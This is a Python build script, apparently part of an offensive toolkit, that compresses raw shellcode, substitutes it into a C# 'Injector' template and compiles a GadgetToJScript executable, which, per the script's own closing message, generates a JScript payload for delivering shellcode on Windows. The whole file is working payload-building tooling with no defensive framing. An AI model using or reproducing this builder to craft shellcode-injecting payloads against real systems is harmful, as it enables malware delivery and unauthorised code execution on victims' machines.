try:
	from argparse import ArgumentParser
	from os import rename, stat
	from string import Template
	from subprocess import check_output, STDOUT
	from tempfile import TemporaryDirectory

except ImportError as exception:
	print("{0}".format(exception))
	exit(1)


def compress(gzip, tmp):
	check_output([gzip, "{0}/GadgetToJScript.bin".format(tmp)]).decode("utf-8").strip()

	with open("{0}/GadgetToJScript.bin.gz".format(tmp), "rb") as gz:
		compressed_shellcode = bytes(gz.read())

	return compressed_shellcode


def build(shellcode, architecture, toolpath, outpath, mcspath, tmp):
	with open("{0}/Templates/Injector.cs".format(toolpath)) as template:
		cs_src = Template(template.read())
		cs_sub = cs_src.substitute({"shellcode": ", ".join(hex(s) for s in shellcode)})

	with open("{0}/Injector.cs".format(tmp), "w") as final:
		final.write(cs_sub)

	result = check_output([mcspath, "-platform:{0}".format(architecture), "-target:winexe", "-out:{0}/GadgetToJScript.exe".format(outpath), "-r:System.Data", "-r:System.Web", "-r:System.Configuration", "-resource:{0}/Injector.cs,SourceCode".format(tmp), "-resource:{0}/Templates/GadgetToJScript.js,Template".format(toolpath), "{0}/src/DisableTypeCheckGadgetGenerator.cs".format(toolpath), "{0}/src/GadgetToJScript.cs".format(toolpath), "{0}/src/InternalCompiler.cs".format(toolpath), "{0}/src/SurrogateGadgetGenerator.cs".format(toolpath), "{0}/src/SurrogateSelector.cs".format(toolpath)], stderr=STDOUT)

	if result:
		print(result)
		exit(1)

	print("[*] Saved at: {0}/GadgetToJScript.exe".format(outpath))
	print("[!] Run the generated executable on a Windows host to produce the final .js payload")


if __name__ == "__main__":
	parser = ArgumentParser()
	parser.add_argument("architecture", type=str)
	parser.add_argument("toolpath", type=str)
	parser.add_argument("outpath", type=str)
	parser.add_argument("gzpath", type=str)
	parser.add_argument("mcspath", type=str)
	args = parser.parse_args()

	tmp = TemporaryDirectory(prefix=args.outpath+"/")

	rename("{0}/GadgetToJScript.bin".format(args.outpath), "{0}/GadgetToJScript.bin".format(tmp.name))
	print("[*] Initial shellcode size: {0} bytes".format(stat("{0}/GadgetToJScript.bin".format(tmp.name)).st_size))
	
	compressed_shellcode = compress(args.gzpath, tmp.name)
	print("[*] Compressed shellcode size: {0} bytes".format(len(compressed_shellcode)))

	build(compressed_shellcode, args.architecture, args.toolpath, args.outpath, args.mcspath, tmp.name)

